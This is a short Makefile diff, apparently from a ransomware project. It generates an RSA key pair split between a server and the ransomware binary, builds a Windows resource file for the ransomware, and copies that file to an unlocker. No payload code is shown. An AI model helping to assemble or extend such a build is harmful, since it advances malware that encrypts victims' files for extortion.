@@ -11,7 +11,8 @@ pre-build:
 	mkdir -p $(BUILD_DIR)/unlocker
 	openssl genrsa -out $(BUILD_DIR)/server/private.pem 2048
 	openssl rsa -in $(BUILD_DIR)/server/private.pem -outform PEM -pubout -out $(BUILD_DIR)/ransomware/public.pem
-	rsrc -manifest ransomware.manifest -ico icon.ico -o build/ransomware/ransomware.syso
+	rsrc -manifest ransomware.manifest -ico icon.ico -o $(BUILD_DIR)/ransomware/ransomware.syso
+	cp $(BUILD_DIR)/ransomware/ransomware.syso $(BUILD_DIR)/unlocker/unlocker.syso
 	cp -r cmd/ransomware $(BUILD_DIR)
 	cp -r server $(BUILD_DIR)
 	cp -r cmd/unlocker $(BUILD_DIR)
